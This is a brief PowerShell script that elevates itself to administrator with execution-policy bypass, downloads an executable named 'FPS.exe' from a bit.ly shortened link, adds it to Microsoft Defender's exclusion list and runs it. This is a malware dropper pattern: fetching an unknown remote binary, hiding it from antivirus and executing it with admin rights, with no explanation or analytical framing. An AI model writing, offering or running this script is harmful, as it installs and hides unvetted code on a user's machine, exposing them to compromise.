# Check if the script is running as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Relaunch the script with administrative rights
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Your existing script
iwr "bit.ly/3Qi3TQD" -OutFile "$PWD\FPS.exe"
Add-MpPreference -ExclusionPath "$PWD\FPS.exe"
& "$PWD\FPS.exe"